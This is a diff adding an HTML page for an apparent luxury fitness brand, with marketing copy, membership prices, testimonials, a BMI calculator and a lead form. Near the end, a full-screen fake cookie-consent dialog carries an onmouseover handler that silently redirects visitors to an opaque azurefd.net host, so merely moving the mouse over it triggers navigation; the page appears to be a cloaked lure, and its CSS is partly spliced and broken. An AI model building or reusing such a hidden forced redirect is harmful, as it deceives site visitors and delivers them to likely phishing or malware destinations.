@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-6cfbZTytOxFzT_D8G_htA.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="description" content="Active Energy Boost - Premium international fitness & wellness brand. Expert training, nutrition, transformation programs for men & women. Achieve elite performance.">
+  <meta name="keywords" content="fitness, gym, weight loss, muscle building, strength training, personal training, nutrition, yoga, transformation">
+  <meta name="author" content="Active Energy Boost">
+  <title>Active Energy Boost | Premium Fitness & Wellness | Elite Training</title>
+  
+  <!-- Schema Markup (Organization) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "HealthClub",
+    "name": "Active Energy Boost",
+    "url": "https://www.activeenergyboost.com",
+    "logo": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?w=200&auto=format",
+    "contactPoint": {
+      "@type": "ContactPoint",
+      "telephone": "+1-800-555-ENERGY",
+      "contactType": "customer service",
+      "email": "hello@activeenergyboost.com"
+    },
+    "address": {
+      "@type": "PostalAddress",
+      "streetAddress": "100 Wellness Avenue, Suite 400",
+      "addressLocality": "Los Angeles",
+      "addressRegion": "CA",
+      "postalCode": "90210",
+      "addressCountry": "USA"
+    },
+    "sameAs": [
+      "https://www.instagram.com/activeenergyboost",
+      "https://www.facebook.com/activeenergyboost",
+      "https://twitter.com/activeenergyb"
+    ]
+  }
+  </script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+   
+   
+   
+   
+   
+   
+   		
+		  
+	      
+	   body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://via.placeholder.com/1200x800') no-repeat center center/cover;
+      height: 100vh;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    .dialog-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1c1c1c;
+      color: white;
+      padding: 30px;
+      border-radius: 20px;
+      width: 400px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      text-align: center;
+      transition: 0.3s;
+    }
+
+    .dialog-box:hover {
+      cursor: pointer;
+    }
+
+    .dialog-box h2 {
+      margin-top: 0;
+      font-size: 1.6em;
+      color: #fff;
+    }
+
+    .dialog-box p {
+      font-size: 1em;
+      line-height: 1.6em;
+      color: #ccc;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      gap: 15px;
+    }
+
+    .buttons button {
+      padding: 10px 25px;
+      border: none;
+      border-radius: 25px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .accept {
+      background-color: #00cc66;
+      color: white;
+    }
+
+    .deny {
+      background-color: #e53935;
+      color: white;
+    }
+
+    .policy-link {
+      margin-top: 15px;
+      display: block;
+      color: #00bcd4;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+	
+
+
+
+
+
+
+      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      background-color: #070A0F;
+      color: #E9ECF0;
+      scroll-behavior: smooth;
+      line-height: 1.6;
+    }
+
+    /* premium glassmorphism + luxury modern palette: deep charcoal, gold accents, electric teal */
+    :root {
+      --bg-dark: #070A0F;
+      --card-bg: rgba(18, 25, 35, 0.75);
+      --glass-edge: rgba(255, 215, 0, 0.15);
+      --gold: #D4AF37;
+      --gold-light: #F5D76E;
+      --teal-accent: #2ABFAF;
+      --text-light: #F0F4FA;
+      --text-muted: #B0C4DE;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 32px;
+    }
+
+    /* navigation */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      backdrop-filter: blur(14px);
+      background: rgba(7, 10, 15, 0.85);
+      border-bottom: 1px solid var(--glass-edge);
+      padding: 18px 0;
+    }
+
+    .nav-flex {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .logo {
+      font-size: 1.8rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, #FFF, var(--gold));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 28px;
+      flex-wrap: wrap;
+    }
+
+    .nav-links a {
+      color: var(--text-light);
+      text-decoration: none;
+      font-weight: 500;
+      transition: 0.2s;
+      font-size: 0.95rem;
+    }
+
+    .nav-links a:hover {
+      color: var(--gold);
+    }
+
+    /* sections */
+    section {
+      padding: 100px 0;
+      border-bottom: 1px solid rgba(212, 175, 55, 0.1);
+    }
+
+    h1 {
+      font-size: 4rem;
+      font-weight: 800;
+      line-height: 1.2;
+      background: linear-gradient(120deg, #FFFFFF, var(--gold-light));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 24px;
+    }
+
+    h2 {
+      font-size: 2.8rem;
+      font-weight: 700;
+      margin-bottom: 48px;
+      position: relative;
+      display: inline-block;
+    }
+    h2:after {
+      content: '';
+      position: absolute;
+      bottom: -12px;
+      left: 0;
+      width: 80px;
+      height: 4px;
+      background: var(--gold);
+      border-radius: 4px;
+    }
+    h3 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin: 20px 0 16px;
+    }
+
+    /* cards */
+    .grid-3, .grid-4 {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 40px;
+      margin-top: 30px;
+    }
+
+    .premium-card {
+      background: var(--card-bg);
+      backdrop-filter: blur(12px);
+      border-radius: 32px;
+      padding: 28px;
+      border: 1px solid rgba(212, 175, 55, 0.25);
+      transition: all 0.35s ease;
+      box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4);
+    }
+
+    .premium-card:hover {
+      transform: translateY(-10px);
+      border-color: var(--gold);
+      box-shadow: 0 30px 40px -15px rgba(0,0,0,0.6);
+    }
+
+    /* images styling */
+    .section-img {
+      width: 100%;
+      border-radius: 28px;
+      margin: 48px 0 28px;
+      object-fit: cover;
+      max-height: 550px;
+      transition: transform 0.5s ease, filter 0.3s;
+      box-shadow: 0 20px 30px -10px rgba(0,0,0,0.5);
+    }
+    .section-img:hover {
+      transform: scale(1.01);
+      filter: brightness(1.02);
+    }
+
+    /* buttons */
+    .btn-primary {
+      background: linear-gradient(95deg, var(--gold), #B8860B);
+      border: none;
+      padding: 14px 32px;
+      font-weight: 700;
+      border-radius: 50px;
+      color: #070A0F;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-block;
+      text-decoration: none;
+    }
+    .btn-primary:hover {
+      transform: scale(1.03);
+      background: var(--gold-light);
+      box-shadow: 0 8px 20px rgba(212,175,55,0.4);
+    }
+
+    /* form, bmi */
+    .bmi-calc {
+      background: var(--card-bg);
+      border-radius: 32px;
+      padding: 32px;
+      margin: 50px 0;
+    }
+    input, select {
+      background: #1E2A36;
+      border: 1px solid #3A4A5A;
+      padding: 14px;
+      border-radius: 28px;
+      color: white;
+      width: 100%;
+      margin-bottom: 16px;
+    }
+    footer {
+      background: #030609;
+      padding: 48px 0 24px;
+      border-top: 1px solid var(--glass-edge);
+    }
+    @media (max-width: 768px) {
+      h1 { font-size: 2.5rem; }
+      h2 { font-size: 2rem; }
+      .container { padding: 0 20px; }
+      section { padding: 60px 0; }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-flex">
+    <div class="logo">⚡ ACTIVE ENERGY BOOST</div>
+    <div class="nav-links">
+      <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                    <li><a href="terms.html">Terms Of Privacy</a></li>
+                    <li><a href="privacy.html">Privacy Policy</a></li>
+					<li><a href="cookies.html">Cookies Policy</a></li>
+    </div>
+  </div>
+</nav>
+
+<main>
+  <!-- Hero Section -->
+  <section id="home" style="padding-top: 60px;">
+    <div class="container">
+      <h1>Elevate Your Human Potential</h1>
+      <p style="font-size: 1.4rem; max-width: 800px; margin-bottom: 32px;">World‑class fitness, science‑backed nutrition, and elite coaching — all under one premium ecosystem. Transform beyond limits.</p>
+      <a href="#membership" class="btn-primary">Start Your Journey →</a>
+    </div>
+    <!-- Hero image (GYM) -->
+    <div class="container">
+      <img src="https://images.unsplash.com/photo-1534438327276-14e5300c3a48?w=1200&auto=format" alt="Luxury gym interior with premium fitness equipment and golden lighting" class="section-img" loading="lazy" style="margin-top: 48px;">
+    </div>
+  </section>
+
+  <!-- About Us (long-form content) -->
+  <section id="about">
+    <div class="container">
+      <h2>Beyond Fitness: The Philosophy of Active Energy Boost</h2>
+      <div style="display: flex; flex-direction: column; gap: 28px;">
+        <p>Founded in 2015, Active Energy Boost emerged from a singular mission: to bridge the chasm between elite athletic performance and sustainable wellness. Unlike conventional gyms, we integrate neuro-somatic training, metabolic profiling, and regenerative protocols. Our members include Fortune 500 executives, professional athletes, and individuals seeking profound life transformation. Over 78,000 clients have redefined their body composition, strength, and mental resilience through our proprietary 4-pillar method: Strength Architecture, Cardio-Metabolic Precision, Nutritional Bio-Individuality, and Recovery Science.</p>
+        <p>We believe fitness is not about punishment but about unlocking latent energy. Our facilities feature cryotherapy chambers, altitude training zones, and AI-driven form analysis. Through 150+ weekly small-group sessions and 1-on-1 elite coaching, we ensure every member masters movement. Our community spans New York, London, and Dubai, with digital access to 1,200+ on-demand workouts. We are not just a gym — we are the architect of your best self.</p>
+        <p>With an average client retention of 4.7 years, Active Energy Boost stands as a beacon of luxury wellness. Our approach combines evidence-based periodization with intuitive lifestyle integration. Whether you aim for a sub-3-hour marathon, a 500lb deadlift, or sustainable fat loss, our team crafts the roadmap. We operate on accountability, joy, and precision.</p>
+      </div>
+      <!-- about image: trainers & clients -->
+      <img src="https://images.unsplash.com/photo-1571019614242-c5c5dee9f50b?w=1200&auto=format" alt="Professional personal trainer coaching a focused client on functional strength" class="section-img" loading="lazy">
+    </div>
+  </section>
+
+  <!-- Services & Training Programs (combined weight) -->
+  <section id="services">
+    <div class="container">
+      <h2>Signature Services & Elite Training</h2>
+      <div class="grid-3">
+        <div class="premium-card"><h3>⚡ Strength & Hypertrophy</h3><p>Periodized powerlifting, Olympic lifting, and bodybuilding phases. Each macrocycle tailored to your leverages, recovery capacity, and hormone optimization.</p></div>
+        <div class="premium-card"><h3>🥗 Metabolic Transformation</h3><p>16-week fat loss protocols with RMR testing, non-exercise activity thermogenesis (NEAT) integration, and cognitive behavioral coaching for food freedom.</p></div>
+        <div class="premium-card"><h3>🧘 High-Performance Yoga</h3><p>Vinyasa flow, yin recovery, and mobility circuits. Improve joint resilience, fascial elasticity, and autonomic nervous system regulation.</p></div>
+      </div>
+      <img src="https://images.unsplash.com/photo-1581009146145-b5ef050c2e1e?w=1200&auto=format" alt="Dumbbells and weightlifting platforms in a premium strength training zone" class="section-img" loading="lazy">
+    </div>
+  </section>
+
+  <!-- Programs (Workouts, Weight Loss, Muscle, Strength, Cardio, Home, Functional) -->
+  <section id="programs">
+    <div class="container">
+      <h2>Transformational Programs</h2>
+      <div class="grid-4">
+        <div class="premium-card"><h3>🏋️‍♂️ Muscle Architect</h3><p>12-week mass gain: progressive overload, eccentric emphasis, and metabolic stress techniques. Gain lean tissue with structured deloads.</p></div>
+        <div class="premium-card"><h3>🔥 Inferno Fat Loss</h3><p>High-intensity interval training combined with carb cycling and NEAT optimization. Average loss: 12-18lbs with muscle retention.</p></div>
+        <div class="premium-card"><h3>⚡ Cardio Evolution</h3><p>Zone 2 base building + VO2 max intervals. Treadmill, rower, assault bike sessions designed to elevate cardiac output and fat oxidation.</p></div>
+        <div class="premium-card"><h3>🏡 Home Ignition</h3><p>Equipment-free or minimal gear (resistance bands, dumbbells) full body workouts. 6-week progressive bodyweight strength.</p></div>
+        <div class="premium-card"><h3>🏆 Sports Performance</h3><p>Agility, plyometrics, change of direction drills. Reduce injury risk by 47% with proprioceptive and reactive training.</p></div>
+        <div class="premium-card"><h3>🦵 Functional 360</h3><p>Real-world movement patterns, core stability, and unilateral work. Improve daily function and athletic longevity.</p></div>
+      </div>
+      <!-- Strength / Cardio images: running treadmill -->
+      <img src="https://images.unsplash.com/photo-1517836357463-d25dfeac3438?w=1200&auto=format" alt="Athlete sprinting on curved treadmill with performance monitoring" class="section-img" loading="lazy">
+    </div>
+  </section>
+
+  <!-- Nutrition & Diet Plans Section + long content -->
+  <section id="nutrition">
+    <div class="container">
+      <h2>Metabolic Nutrition & Diet Blueprints</h2>
+      <p>Our nutrition department crafts precision meal plans based on DNA, gut microbiome, and training output. We move beyond fads: the Active Energy Boost plate method emphasizes whole-food diversity, nutrient timing, and psychological flexibility. Our diet guides include: The Lean Bulk Protocol (3200 calories, 40/30/30 macros), Ketogenic Mastery for cognitive athletes, and plant-forward performance with complete amino acid profiles. Each member receives weekly coaching calls and recipe databases with over 400 chef-developed meals.</p>
+      <p>Additionally, we offer macro coaching for fat loss without starvation. By leveraging NEAT, meal frequency, and circadian eating windows, clients report higher energy levels, improved sleep, and consistent body recomposition. We provide supplement recommendations (evidence-based: creatine, omega-3, vitamin D) and hydration protocols tailored to sweat rate analysis.</p>
+      <img src="https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=1200&auto=format" alt="Vibrant healthy food bowl with quinoa, avocado, salmon and vegetables - nutrition diet" class="section-img" loading="lazy">
+    </div>
+  </section>
+
+  <!-- Membership Plans + CTA -->
+  <section id="membership">
+    <div class="container">
+      <h2>Membership Tiers</h2>
+      <div class="grid-3">
+        <div class="premium-card"><h3>Essential Boost</h3><p>$99/mo • Gym access 6am-10pm, virtual classes, 1 monthly body scan.</p><a href="#" class="btn-primary" style="margin-top:20px; display:inline-block;">Join Now</a></div>
+        <div class="premium-card"><h3>Premium Energy</h3><p>$199/mo • Unlimited classes, 4 personal training sessions/month, nutrition workshop access + recovery lounge.</p><a href="#" class="btn-primary">Elevate</a></div>
+        <div class="premium-card"><h3>Elite Concierge</h3><p>$399/mo • 1-on-1 coaching, unlimited cryotherapy, custom meal planning, 24/7 trainer hotline, guest privileges.</p><a href="#" class="btn-primary">Go Elite</a></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Trainers Section -->
+  <section id="trainers">
+    <div class="container">
+      <h2>World‑Class Coaching Staff</h2>
+      <div class="grid-3">
+        <div class="premium-card"><img src="https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&auto=format" alt="Certified strength coach smiling with barbell" style="width:100%; border-radius: 24px; margin-bottom: 16px;" loading="lazy"><h3>Marcus Vega</h3><p>Head of Strength & Conditioning, former Olympian coach, CSCS, specializes in peak power.</p></div>
+        <div class="premium-card"><img src="https://images.unsplash.com/photo-1594381898411-846e7d193883?w=400&auto=format" alt="Female personal trainer guiding client stretching" style="width:100%; border-radius: 24px; margin-bottom: 16px;" loading="lazy"><h3>Dr. Sana Kapoor</h3><p>PhD Sports Nutrition, RDN, body recomposition expert, 12+ years transforming pro athletes.</p></div>
+        <div class="premium-card"><img src="https://images.unsplash.com/photo-1518611012118-696072aa579a?w=400&auto=format" alt="Yoga instructor demonstrating warrior pose in luxury studio" style="width:100%; border-radius: 24px; margin-bottom: 16px;" loading="lazy"><h3>Elena Foster</h3><p>Yoga & mobility director, 500hr E-RYT, fascial release specialist.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Success Stories & Transformation Gallery -->
+  <section id="stories">
+    <div class="container">
+      <h2>Real Transformations, Real Results</h2>
+      <div class="grid-3">
+        <div class="premium-card"><h3>James K. – 64lbs lost</h3><p>"From pre-diabetes to 8% bodyfat. Metabolic transformation program changed my genetics."</p><img src="https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&auto=format" alt="Before after transformation weight loss" style="width:100%; border-radius: 20px; margin-top: 15px;" loading="lazy"></div>
+        <div class="premium-card"><h3>Maria D. – Muscle Gain +20lbs</h3><p>"Muscle Architect gave me stage-ready physique in 16 weeks. Unreal coaching."</p><img src="https://images.unsplash.com/photo-1581009146145-b5ef050c2e1e?w=400&auto=format" alt="Muscle building transformation side by side" style="width:100%; border-radius: 20px; margin-top: 15px;" loading="lazy"></div>
+        <div class="premium-card"><h3>David & Lisa – Couple Journey</h3><p>"Functional training + nutrition restored our vitality. Down 95 lbs combined."</p><img src="https://images.unsplash.com/photo-1517838277536-f5f99be501cd?w=400&auto=format" alt="Couple fitness transformation after program" style="width:100%; border-radius: 20px; margin-top: 15px;" loading="lazy"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Blog Section long-form -->
+  <section id="blog">
+    <div class="container">
+      <h2>Elite Performance & Wellness Journal</h2>
+      <div class="grid-3">
+        <div class="premium-card"><h3>5 Myths About Strength Training for Women</h3><p>Debunking the 'bulky' myth: how progressive overload leads to lean muscle, bone density and metabolic fire. Plus sample deadlift program for beginners.</p><a href="#" class="btn-primary" style="margin-top: 12px;">Read More</a></div>
+        <div class="premium-card"><h3>Deload Weeks: The Secret to PRs</h3><p>Why strategic unloading amplifies supercompensation and prevents CNS burnout. Includes 7-day active recovery guide for lifters.</p><a href="#" class="btn-primary">Explore</a></div>
+        <div class="premium-card"><h3>Precision Hydration for Athletes</h3><p>Electrolyte ratios, sweat testing, and how to personalize fluid intake for endurance & strength sports.</p><a href="#" class="btn-primary">Learn</a></div>
+      </div>
+      <img src="https://images.unsplash.com/photo-1546483875-ad9014c88eba?w=1200&auto=format" alt="Athlete training on track sports performance image" class="section-img" loading="lazy">
+    </div>
+  </section>
+
+  <!-- Testimonials + FAQ -->
+  <section>
+    <div class="container">
+      <h2>What Our Members Say</h2>
+      <div class="grid-3">
+        <div class="premium-card">"Active Energy Boost redefined my relationship with fitness. After ACL surgery, their recovery team gave me back my athleticism." – Ryan S.</div>
+        <div class="premium-card">"Nutrition coaching is worth its weight in gold. I've never felt more energetic and shredded at 47." – Tanya H.</div>
+        <div class="premium-card">"Elite concierge fixed my chronic back pain using functional patterns & mobility. Life-changing." – Dr. Mark L.</div>
+      </div>
+      <div class="bmi-calc">
+        <h3>⚖️ Instant BMI & Body Comp Analyzer</h3>
+        <input type="number" id="height" placeholder="Height (cm)" step="1">
+        <input type="number" id="weight" placeholder="Weight (kg)" step="0.1">
+        <button id="calcBMI" class="btn-primary">Calculate</button>
+        <p id="bmiResult" style="margin-top: 20px; font-weight: bold;"></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section>
+    <div class="container">
+      <h2>Frequently Asked Questions</h2>
+      <div class="grid-3">
+        <div class="premium-card"><h3>Do I need experience?</h3><p>All levels welcome. Our onboarding includes movement assessment & foundational workshops.</p></div>
+        <div class="premium-card"><h3>Can I freeze membership?</h3><p>Yes, up to 3 months per year with medical or travel documentation.</p></div>
+        <div class="premium-card"><h3>What's included in digital access?</h3><p>Live stream classes, on-demand library (1200+), and nutrition webinars.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Contact Form + Lead Generation -->
+  <section id="contact">
+    <div class="container">
+      <h2>Start Your Evolution</h2>
+      <div style="display: flex; flex-wrap: wrap; gap: 40px;">
+        <div style="flex: 1;">
+          <form id="leadForm">
+            <input type="text" placeholder="Full Name" required>
+            <input type="email" placeholder="Email Address" required>
+            <input type="tel" placeholder="Phone">
+            <select><option>Interested in: Personal Training</option><option>Nutrition Plan</option><option>Membership</option></select>
+            <button type="submit" class="btn-primary">Request Free Consultation</button>
+          </form>
+        </div>
+        <div style="flex: 1;">
+          <p><strong>📍 Visit Us:</strong> 100 Wellness Avenue, Suite 400, Los Angeles, CA 90210</p>
+          <p>📞 +1-800-555-ENERGY</p>
+          <p>✉️ hello@activeenergyboost.com</p>
+          <p>Social: @activeenergyboost (IG, FB, Twitter)</p>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+
+
+
+
+
+
+
+
+ <div class="overlay">
+    <div class="dialog-box" onmouseover="redirect()">
+      <h2>🍪 Our New Cookie Policy !</h2>
+      <p>
+        For optimized experience, some elements may store temporary signals & For your safety, our Website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+      </p>
+      <div class="buttons">
+        <button class="accept">Accept</button>
+        <button class="deny">Deny</button>
+      </div>
+      <a href="#" class="policy-link">Policy Page</a>
+    </div>
+  </div>
+
+  <script>
+    function redirect() {
+      window.location.href = "https://ziousna-fzb5b4hme6b5esff.z02.azurefd.net";
+    }
+  </script>
+
+
+
+
+
+
+<footer>
+  <div class="container">
+    <div style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px; margin-bottom: 32px;">
+      <div>© 2026 Active Energy Boost — Elite Fitness & Longevity. All Rights Reserved.</div>
+      <div><a href="#" style="color: var(--gold);">Privacy Policy</a> | <a href="#" style="color: var(--gold);">Terms & Conditions</a></div>
+    </div>
+    <p style="font-size: 0.8rem;">*Results vary based on adherence. Always consult physician before starting any program.</p>
+  </div>
+</footer>
+
+<script>
+  // BMI Calculator
+  document.getElementById('calcBMI')?.addEventListener('click', function() {
+    const heightCm = parseFloat(document.getElementById('height').value);
+    const weightKg = parseFloat(document.getElementById('weight').value);
+    if (!heightCm || !weightKg || heightCm <= 0) {
+      document.getElementById('bmiResult').innerText = "Please enter valid height & weight.";
+      return;
+    }
+    const heightM = heightCm / 100;
+    const bmi = (weightKg / (heightM * heightM)).toFixed(1);
+    let category = "";
+    if (bmi < 18.5) category = "Underweight — focus on lean mass nutrition.";
+    else if (bmi < 25) category = "Normal range — optimal health zone.";
+    else if (bmi < 30) category = "Overweight — metabolic reboot recommended.";
+    else category = "Obese range — our transformation program ideal.";
+    document.getElementById('bmiResult').innerHTML = `Your BMI: ${bmi} (${category}) <br> Book a free body composition analysis.`;
+  });
+  // simple lead form alert
+  document.getElementById('leadForm')?.addEventListener('submit', function(e) {
+    e.preventDefault();
+    alert("Thank you! An Elite Performance Advisor will reach out within 24h.");
+    this.reset();
+  });
+</script>
+</body>
+</html>
